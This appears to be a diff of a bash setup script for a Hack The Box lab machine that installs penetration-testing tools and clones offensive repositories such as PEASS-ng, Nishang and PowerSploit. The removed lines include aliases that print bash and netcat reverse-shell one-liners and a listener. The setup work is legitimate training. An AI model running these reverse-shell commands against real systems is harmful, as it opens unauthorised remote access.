@@ -1,26 +1,32 @@
 ```bash
+
 #!/bin/bash
-# Minimal HTB bootstrap — fast, quiet, idempotent.
+# Minimal HTB bootstrap — quiet, idempotent, no aliases.
+# - Updates apt safely (handles Debian testing codename changes)
+# - Installs core tools via apt
+# - Preps wordlists (rockyou)
+# - Clones/updates key GitHub repos (PEASS-ng, PayloadsAllTheThings, GTFOBins, Nishang, PowerSploit, Feroxbuster)
+# - Installs impacket, pwncat-cs via pip
+# - Installs CrackMapExec from GitHub (not PyPI)
+# - Builds Feroxbuster via cargo if not already available
 
 set -e
 export DEBIAN_FRONTEND=noninteractive
 
-echo "[*] apt update..."
+log() { echo "[*] $*"; }
+
+# --- apt update (safe on Debian testing rollovers) ---
+log "apt update..."
 sudo apt-get -yq update --allow-releaseinfo-change
 
-echo "[*] Installing core tools..."
+# --- core tools ---
+log "Installing core tools..."
 sudo apt-get -yq install --no-install-recommends \
   nmap gobuster enum4linux smbmap smbclient \
   rlwrap tmux jq unzip wget curl git python3-pip build-essential seclists
 
-# ---------- Feroxbuster (from official release) ----------
-echo "[*] Installing feroxbuster..."
-mkdir -p "$HOME/tools"
-curl -fsSL https://github.com/epi052/feroxbuster/releases/latest/download/feroxbuster_amd64.deb \
-  -o "$HOME/tools/feroxbuster.deb"
-sudo dpkg -i "$HOME/tools/feroxbuster.deb" || sudo apt-get -yq -f install
-
-# ---------- Wordlists ----------
+# --- wordlists (rockyou ready) ---
+log "Preparing wordlists..."
 mkdir -p "$HOME/seclists"
 ln -sfn /usr/share/seclists "$HOME/seclists"
 if [ ! -f "$HOME/seclists/Passwords/rockyou.txt" ] && [ -f /usr/share/wordlists/rockyou.txt.gz ]; then
@@ -28,89 +34,69 @@ if [ ! -f "$HOME/seclists/Passwords/rockyou.txt" ] && [ -f /usr/share/wordlists/
   gunzip -c /usr/share/wordlists/rockyou.txt.gz > "$HOME/seclists/Passwords/rockyou.txt" || true
 fi
 
-# ---------- PEAS (Linux/Windows) ----------
-mkdir -p "$HOME/tools/peas"
-curl -fsSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh \
-  -o "$HOME/tools/peas/linpeas.sh" && chmod +x "$HOME/tools/peas/linpeas.sh"
-curl -fsSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe \
-  -o "$HOME/tools/peas/winPEASx64.exe"
-
-# ---------- Windows basics (quiet) ----------
-python3 -m pip install -q --upgrade pip || true
-python3 -m pip install -q impacket crackmapexec pwncat-cs || true
-
-# ---------- Shell helpers (aliases + on-demand functions) ----------
-if ! grep -q "^# HTB_BLOCK_BEGIN" "$HOME/.bashrc" 2>/dev/null; then
-cat >> "$HOME/.bashrc" <<'HTBRC'
-
-# HTB_BLOCK_BEGIN
-# --- Aliases ---
-alias serve='python3 -m http.server 8000'              # quick HTTP server in cwd
-alias linpeas='bash ~/tools/peas/linpeas.sh'           # run linPEAS
-alias winpeas='~/tools/peas/winPEASx64.exe'            # path to winPEAS
-alias rockyou='~/seclists/Passwords/rockyou.txt'       # wordlist shortcut
-alias cme='crackmapexec'                               # shorter CME
-alias listener='rlwrap nc -lvnp 4444'                  # common listener
-alias lhost='ip -4 addr show tun0 | awk "/inet /{print \$2}" | cut -d/ -f1'  # show HTB VPN IP
-
-# Quick payload printers (use current LHOST from alias above)
-alias revbash='echo bash -i \>\& /dev/tcp/$(lhost)/4444 0\>\&1'
-alias revnc='echo rm /tmp/f\; mkfifo /tmp/f\; cat /tmp/f\|/bin/sh -i 2\>\&1\|nc $(lhost) 4444 \>/tmp/f'
-
-# --- On-demand repo fetch/update functions ---
-getpta() {
-  local dir=~/tools/payloads
-  if [ -d "$dir/.git" ]; then
-    echo "[*] Updating PayloadAllTheThings..."
-    git -C "$dir" pull --quiet
+# --- helper: clone or pull a repo ---
+clone_or_pull () {
+  local url="$1" dest="$2"
+  if [ ! -d "$dest/.git" ]; then
+    log "Cloning $(basename "$dest")..."
+    git clone "$url" "$dest"
   else
-    echo "[*] Cloning PayloadAllTheThings..."
-    git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git "$dir"
+    log "Updating $(basename "$dest")..."
+    git -C "$dest" pull --quiet || true
   fi
 }
 
-getgtfo() {
-  local dir=~/tools/gtfobins
-  if [ -d "$dir/.git" ]; then
-    echo "[*] Updating GTFOBins..."
-    git -C "$dir" pull --quiet
-  else
-    echo "[*] Cloning GTFOBins..."
-    git clone https://github.com/GTFOBins/GTFOBins.github.io.git "$dir"
-  fi
-}
+# --- GitHub tool repos ---
+mkdir -p "$HOME/tools"
 
-getnishang() {
-  local dir=~/tools/nishang
-  if [ -d "$dir/.git" ]; then
-    echo "[*] Updating Nishang..."
-    git -C "$dir" pull --quiet
-  else
-    echo "[*] Cloning Nishang..."
-    git clone https://github.com/samratashok/nishang.git "$dir"
-  fi
-}
+# Feroxbuster (repo; binary built below)
+clone_or_pull "https://github.com/epi052/feroxbuster.git" "$HOME/tools/feroxbuster"
 
-getpowersploit() {
-  local dir=~/tools/PowerSploit
-  if [ -d "$dir/.git" ]; then
-    echo "[*] Updating PowerSploit..."
-    git -C "$dir" pull --quiet
-  else
-    echo "[*] Cloning PowerSploit..."
-    git clone https://github.com/PowerShellMafia/PowerSploit.git "$dir"
-  fi
-}
+# PEASS-ng (linPEAS/winPEAS)
+clone_or_pull "https://github.com/carlospolop/PEASS-ng.git" "$HOME/tools/PEASS-ng"
 
-# Tiny wrappers for speed
-alias pta='getpta'
-alias gtfo='getgtfo'
-alias nish='getnishang'
-alias psploit='getpowersploit'
-# HTB_BLOCK_END
+# PayloadsAllTheThings
+clone_or_pull "https://github.com/swisskyrepo/PayloadsAllTheThings.git" "$HOME/tools/payloads"
 
-HTBRC
+# GTFOBins (offline reference)
+clone_or_pull "https://github.com/GTFOBins/GTFOBins.github.io.git" "$HOME/tools/gtfobins"
+
+# Nishang (PowerShell offensive scripts)
+clone_or_pull "https://github.com/samratashok/nishang.git" "$HOME/tools/nishang"
+
+# PowerSploit (post-exploitation)
+clone_or_pull "https://github.com/PowerShellMafia/PowerSploit.git" "$HOME/tools/PowerSploit"
+
+# --- PEASS convenience: make sure linPEAS is executable (repo has builder; script path varies) ---
+if [ -f "$HOME/tools/PEASS-ng/linPEAS/linpeas.sh" ]; then
+  chmod +x "$HOME/tools/PEASS-ng/linPEAS/linpeas.sh" || true
 fi
 
-echo "[*] Done. Open a new shell or run:  source ~/.bashrc"
+# --- Python tooling ---
+log "Upgrading pip (quiet) and installing Python tools..."
+python3 -m pip install -q --upgrade pip || true
+python3 -m pip install -q impacket pwncat-cs || true
+
+# CrackMapExec installs from GitHub (PyPI is not maintained for CME)
+if ! command -v cme >/dev/null 2>&1 && ! command -v crackmapexec >/dev/null 2>&1; then
+  log "Installing CrackMapExec from GitHub..."
+  python3 -m pip install -q "git+https://github.com/Porchetta-Industries/CrackMapExec.git" || true
+fi
+
+# --- Feroxbuster binary build (one-time) ---
+# If feroxbuster isn't already in PATH, build it with cargo (Rust).
+if ! command -v feroxbuster >/dev/null 2>&1; then
+  log "Building feroxbuster via cargo..."
+  sudo apt-get -yq install --no-install-recommends cargo || true
+  # Prefer installing from crates.io for a clean binary in ~/.cargo/bin
+  cargo install feroxbuster || true
+  # Ensure cargo bin dir is in PATH for future shells
+  if ! grep -q 'HOME/.cargo/bin' "$HOME/.profile" 2>/dev/null; then
+    echo 'export PATH="$HOME/.cargo/bin:$PATH"' >> "$HOME/.profile"
+  fi
+fi
+
+log "Done. (Open a new shell to pick up any PATH changes)"
+
+
 ```
